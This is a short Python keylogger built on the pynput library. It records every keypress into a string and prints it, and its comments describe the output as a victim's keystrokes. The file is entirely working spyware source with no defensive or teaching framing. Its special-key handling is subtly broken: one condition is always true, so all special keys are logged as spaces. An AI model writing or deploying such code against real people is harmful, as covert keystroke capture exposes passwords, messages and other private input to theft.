import pynput.keyboard as pavi
stored_key=""
def key_press(key):
    global stored_key
    try:
      stored_key=stored_key + str(key.char)
      print(stored_key) #display victim key_strokes
    except AttributeError:
        if key==key.space or key.backspace:
          stored_key=stored_key+" "
          print(" ")
        else:
          stored_key = stored_key +" "+ str(key)+ " "
          print(stored_key)  # display victim key_stocks


"""                       callback function
                                  |
                                  V         """
key_record=pavi.Listener(on_press=key_press)
#using with command
with key_record as listener:
    listener.join()
